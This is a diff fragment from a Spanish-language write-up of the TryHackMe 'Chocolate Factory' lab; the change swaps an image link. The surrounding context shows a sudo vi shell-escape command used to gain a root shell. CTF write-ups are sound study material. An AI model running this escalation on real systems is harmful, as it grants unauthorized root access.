@@ -74,7 +74,7 @@ y lanzamos este comando
 
      sudo -u root  vi -c ':!/bin/sh' /dev/null
 
-![[tryhackme/easy/chocolate factory/root.png]]
+![image](https://github.com/user-attachments/assets/5b3f09a2-5be8-438c-8b42-2331f2430008)
 
 y seremos root! 
 
